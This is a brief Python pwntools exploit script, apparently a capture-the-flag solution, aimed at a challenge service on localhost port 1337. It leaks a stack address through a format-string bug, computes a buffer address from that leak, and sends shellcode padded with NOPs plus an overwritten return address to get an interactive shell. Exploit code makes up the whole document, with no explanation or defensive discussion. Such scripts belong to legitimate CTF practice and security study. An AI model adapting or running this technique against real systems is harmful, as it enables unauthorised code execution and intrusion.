from pwn import *

context.arch = 'amd64'
#context.binary = 'chal'
context.log_level = 'debug'

#p = process('./chal')
p = remote('localhost', 1337)

sh = asm(shellcraft.sh()) # Shell Code
print(shellcraft.sh())

p.sendlineafter("> ", "%6$p") # FSB To leak stack
print(p.recvuntil("> "))
p.sendline("")
p.recvuntil("> ")

p.sendline("whoami")

leak = p.recvuntil("> ").decode().rstrip("> ")
print("leak", leak)

p.sendline("exit") # Exit to return to start of main
leaked_addr = int(leak, 16)
username_addr = leaked_addr - 0xd0 # Found from objdump
payload2 = sh
payload2 += b"\x90" * (192 - len(sh))
payload2 += p64(username_addr)

p.recvuntil("> ")
p.sendline(payload2)
p.recvuntil("> ")
p.sendline("")

p.interactive()